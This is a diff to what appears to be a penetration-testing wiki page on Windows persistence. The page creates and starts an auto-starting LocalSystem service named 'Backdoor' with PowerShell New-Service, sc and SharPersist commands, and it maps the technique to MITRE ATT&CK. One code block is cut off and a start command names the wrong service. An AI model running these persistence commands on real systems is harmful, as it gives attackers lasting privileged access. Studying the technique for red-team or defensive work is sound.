@@ -37,9 +37,13 @@ This procedure involves creating a backdoor service that runs with elevated priv
 
 This procedure involves creating a backdoor service that runs with elevated privileges, providing a persistent access point for an attacker. This can be achieved by creating a new service or modifying an existing one with weak permissions. The backdoor service can be used to maintain access to the system, exfiltrate data, or execute further attacks. From a technical perspective, the attacker needs to have administrative privileges to create or modify services. From a business standpoint, this type of attack can result in the compromise of sensitive data, intellectual property theft, or disruption of critical systems.
 
+ 
+
 ## Requirements
 
 1. Administrative privileges on the target system
+
+ 
 
 ## Defense
 
@@ -49,6 +53,8 @@ This procedure involves creating a backdoor service that runs with elevated priv
 
 1. Implement application whitelisting to prevent unauthorized service creation or modification
 
+ 
+
 ## Objectives
 
 1. Create a backdoor service with elevated privileges
@@ -57,12 +63,20 @@ This procedure involves creating a backdoor service that runs with elevated priv
 
 1. Exfiltrate sensitive data or execute further attacks
 
+ 
+
 # Instructions
 
 1. To create a backdoor service that will start automatically or on-demand, run the following commands in PowerShell:
 
+ 
+
+
+
 **Code**: [[# Powershell
 New-Service -Name "Backdoor" -BinaryP]]
+
+
 
 > This command creates a Windows service named 'Backdoor' that will execute the binary located at 'C:\Windows\Temp\backdoor.exe'. The service is set to start automatically and has a description of 'Nothing to see here.'. The 'sc start pentestlab' command is used to start the service.
 
@@ -70,11 +84,17 @@ The 'SharPersist' tool is used to create a persistence mechanism for the backdoo
 
 The 'sc' command is used to create a new service named 'Backdoor' that executes the command 'cmd.exe /k C:\temp\backdoor.exe' when started. The service is set to start automatically and runs as the 'LocalSystem' account. The 'sc start Backdoor' command is used to start the service.
 
+
+
 **Command** ([[Create Backdoor Service]]):
 
 ```bash
 New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
 ```
+
+
+
+
 
 **Command** ([[Start Backdoor Service]]):
 
@@ -82,11 +102,19 @@ New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Des
 sc start pentestlab
 ```
 
+
+
+
+
 **Command** ([[Create Backdoor Persistence using SharPersist]]):
 
 ```bash
 SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
 ```
+
+
+
+
 
 **Command** ([[Create Backdoor Service using sc]]):
 
@@ -94,11 +122,17 @@ SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n 
 sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
 ```
 
+
+
+
+
 **Command** ([[Start Backdoor Service using sc]]):
 
 ```bash
 sc start Backdoor
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -126,3 +160,5 @@ sc start Backdoor
 - [[Elevated]]
 - [[Services Elevated]]
 - [[Windows - Persistence]]
+
+
